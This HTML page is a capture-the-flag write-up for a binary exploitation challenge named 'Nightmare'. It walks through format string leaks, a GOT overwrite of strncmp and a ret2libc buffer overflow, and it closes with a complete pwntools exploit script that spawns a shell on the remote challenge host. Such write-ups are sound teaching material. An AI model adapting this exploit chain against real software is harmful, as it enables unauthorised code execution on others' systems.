<div class="page-header">
    <div class="page-header-inner">
        <div class="page-header-inner2">
            <h1>PWN/Nightmare - Easy</h1>
            <h2>July 2021</h2>
            <h4>Frmt_Str Got Overwrite + Ret2libc</h4>
        </div>
    </div>
</div>
<H4>Problem</H4>
<div class="paragraph">
    <p>
    You seem to be stuck in an endless nightmare. Can you find a way out?
    <br>
    </p>
</div>
<H4>Solution</H4>
<div class="paragraph">
    <p>
    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
        <br><br>
    	We will start off by reversing the binary. It has 4 interesting functions. The main function runs in an infinite loop and calls either func_1() or func_2() depending on our input. There is no way to exit this loop from the main function. Func_1() reads in 0x100 bytes into a local buffer and then copies it over into stderr using fprintf(). This actually has a format string vulnerability, however since output is redirected into stderr we can not use it to leak any data. We may however be able to use it for a format string write exploit.
    	<br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/nightmare1.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        Lets now look at func_2() and check(). Func_2() starts off by reading in 6 bytes. It then calls the check function to compare this string to 'lulzk'. If the strings are equal, a success message is printed out and exit(0) is called. After this check there is another format string vulnerability. Lots of those in this binary it seems. <br><br>This time it seems like we can actually use it to perform format string leaks. We now have a way to leak values from the stack, and a way to write values to arbitrary locations with out format string vulnerabilities.  
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/nightmare2.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        Lets check the protections before we start planning out our exploit. The binary comes with all protections enabled except relro. This is very interesting since relro being disabled means that both exit handlers (such as the fini array) and the got table are writeable. Given the proper leaks, we may be able to overwrite a got entry with an address of our choosing and thus get a shell.
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/nightmare3.png" alt="">
</div>
<div class="paragraph">
    <p>
        <br><br>
        Lets start by getting our leaks. We will need both a pie leak and a libc leak. We can get both of these using the format string vulnerability in func_2(). Pie can be leaked out at the first stack offset and a valid libc address can be leaked out at the 13th offset. 
        <br><br>
        Now that we have our leaks, we can start working on our exploit. We can perform all of our format string writes using func_1(). Since strncmp() is only called in func_2(), it will make the perfect target for a got overwrite. My initial idea was to overwrite this address with a one gadget. Unfortunately none of the one gadgets ended up working in this case so I had to chose a different route. 
        <br><br>
        At this point I believe there are multiple different ways to solve this. I decided to redirect execution towards the fgets() in func_1(). While this may not look interesting, redirecting execution to the correct place in func_2() will allow us to read in many more bytes into the stack variable than intended, and thus cause a buffer overflow. This also bypasses the canary since the function is never properly setup. Now we can just do a standard ret2libc attack to get a shell and retrieve the flag. 
        <br><br> 
        The full exploit is posted below.
        <br><br>
    </p>
</div>
<div>
    <img src="../imgs/hackthebox/nightmare9.png" alt="">
</div>
<div>
    <style 
        type="text/css">
            pre code {
                      background-color: #008080;
                      border: 1px solid #999;
                      display: block;
                      padding: 15px;
                      color:  #F5F5DC;
                    }
    </style>
    <pre>
        <code>
#!/usr/bin/env python

from pwn import *
elf = context.binary = ELF('./vuln')
libc = elf.libc

local = False

if local:
    p = elf.process()
else:
    host = '139.59.166.56'
    port = 31471
    p = remote(host,port)

#==========================LEAKS================================#

p.sendline('2')
p.sendline('%p')
p.recvuntil('>> ')
elf.address = int(p.recvline().strip(),16) - 0x2079
print("[+] Binary Leak: " + str(hex(elf.address)))

p.sendline('2')
p.sendline('%13$p')
p.recvuntil('>> ')
libc.address = int(p.recvline().strip(),16) - 0x270b3
print("[+] Libc Leak: " + str(hex(libc.address)))

#==========================EXPLOIT==============================#

overflow = elf.address + 0x1358
target = elf.got.strncmp

i = 0
for c in p64(overflow)[:6]:
    if i==0:
        p.sendline('-1')
    else:
        p.sendline('1')
    write  = b"%"+(str(c).rjust(3,"0")).encode()+b"c"
    write += b"%7$hhnAAAAA"
    write += p64(target+i)
    i+=1
    p.sendline(write)

rop = ROP([elf])
binsh = p64(next(libc.search(b'/bin/sh\x00')))
system = p64(libc.sym['system'])
pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])

payload = b'A'*197 + pop_rdi + binsh + system

p.sendline('2')
p.sendline(payload)
p.sendline('cat flag.txt')

p.interactive()
        </code>
    </pre>
</div>
<br><br>
<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>